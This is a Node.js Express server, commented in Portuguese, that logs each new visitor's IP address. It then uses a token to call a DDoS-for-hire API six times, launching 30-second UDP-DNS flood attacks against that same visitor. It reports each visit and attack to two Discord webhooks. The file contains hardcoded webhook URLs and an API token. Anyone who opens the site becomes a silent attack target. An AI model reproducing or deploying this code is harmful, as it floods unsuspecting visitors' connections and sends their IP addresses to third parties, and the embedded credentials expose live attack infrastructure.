const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 4000

const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
const configFile = path.join(__dirname, 'data', 'config.json');
const discordWebhookUrl = 'https://discord.com/api/webhooks/1271927639380328552/vINs9B4ZsbixDl4MzqVt2YWckm08VqdR-0osHOCPd25PqbePAOomq569Crl28yFP8acm'; // Substitua pelo URL correto do seu webhook
const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1271934485382041752/gS-cZhznQJKrs0zCzvkFeUhaMkNjV1eicrtFk8fllpe_julu_TNiGNaA9ZdwL-buoTck';
let lock = false;

// Função para enviar requisição à API
async function sendApiRequest(ip) {
    for(let i = 0; i<6; i++){
       const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
    
    try {
        await axios.get(url);
        console.log(`Requisição enviada para o IP: ${ip}`);
    } catch (error) {
        console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
    }
  }
}

async function verificar() {
    try {
      const response = await axios.get('https://darlingapi.com/status?token=af1f1818-3541-411f-a643-db88e2c575ff');
      const data = response.data;
  
      if (data.account.running > 0) {
            const url = "https://darlingapi.com/stop_all?token=af1f1818-3541-411f-a643-db88e2c575ff"
            await axios.get(url)
            console.log('Ataques anterios interrompidos')
      }
    } catch (error) {
      console.error('Erro ao verificar o status dos ataques:', error);
    }
  }

// Função para enviar webhooks ao Discord
async function sendDiscordWebhooks(ip, timestamp) {
    try {
        await axios.post(discordWebhookUrl, {
            embeds: [{
                title: 'Novo Visitante',
                description: `Um novo visitante acessou o site.`,
                color: 5814783,
                fields: [
                    {
                        name: 'IP',
                        value: ip,
                        inline: true
                    },
                    {
                        name: 'Data e Hora',
                        value: timestamp,
                        inline: true
                    }
                ],
                footer: {
                    text: 'Visitante registrado'
                },
                timestamp: new Date()
            }]
        });

        await axios.post(discordWebhookUrl2, {
            embeds: [{
                title: 'DDOS ENVIADO',
                description: `Ataque enviado.`,
                color: 5814783,
                fields: [
                    {
                        name: 'IP',
                        value: ip,
                        inline: true
                    },
                    {
                        name: 'Concurrents',
                        value: '6',
                        inline: true
                    },
                    {
                        name: 'Time',
                        value: '30',
                        inline: true
                    }
                ],
                timestamp: new Date()
            }]
        });
    } catch (error) {
        console.error('Erro ao enviar webhooks:', error.message);
    }
}

// Função para limpar o arquivo de visitantes
async function cleanupVisitors() {
    try {
        const now = new Date();
        let config;

        try {
            const configData = await fs.readFile(configFile);
            config = JSON.parse(configData);
        } catch (err) {
            console.log('Config file not found or unreadable. Creating a new one.');
            config = { lastCleanup: now.toISOString() };
            await fs.writeFile(configFile, JSON.stringify(config, null, 2));
        }

        const lastCleanup = new Date(config.lastCleanup);

        if ((now - lastCleanup) >= 5 * 60 * 1000) {
            await fs.writeFile(visitorsFile, JSON.stringify([], null, 2));
            console.log('Visitors file cleaned.');

            config.lastCleanup = now.toISOString();
            await fs.writeFile(configFile, JSON.stringify(config, null, 2));
            console.log('Config updated.');
        } else {
            console.log('No need for cleanup yet.');
        }
    } catch (err) {
        console.error('Error during cleanup:', err);
    }
}

setInterval(cleanupVisitors, 5 * 60 * 1000);
cleanupVisitors().catch(err => console.error('Error executing cleanup on startup:', err));

// Middleware para processar e registrar IPs apenas na página principal
app.use(async (req, res, next) => {
    if (req.path === '/admin') {
        // Se estiver na rota /admin, pula o registro de IP
        return next();
    }

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let timestamp = new Date().toISOString();

    if (typeof ip === 'string') {
        ip = ip.split(',')[0].trim();
    }

    if (lock) {
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    lock = true;

    try {
        let visitors = [];
        try {
            const data = await fs.readFile(visitorsFile);
            visitors = JSON.parse(data);
        } catch (err) {
            if (err.code !== 'ENOENT') {
                console.error('Error reading visitors file:', err);
            }
        }

        const ipEntry = visitors.find(visitor => visitor.ip === ip);

        if (!ipEntry) {
            if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('::'))) return;
            visitors.push({ ip, timestamp });
            await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
            await verificar()
            await sendApiRequest(ip);
            await sendDiscordWebhooks(ip, timestamp);
        }
    } catch (err) {
        console.error('Error processing visitors file:', err);
    } finally {
        lock = false;
    }

    next();
});

// Rota principal serve os arquivos estáticos e registra os IPs
app.use(express.static(path.join(__dirname, 'public')));

// Rota /admin não registra IPs
app.use('/admin', require('./routes/admin'));

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
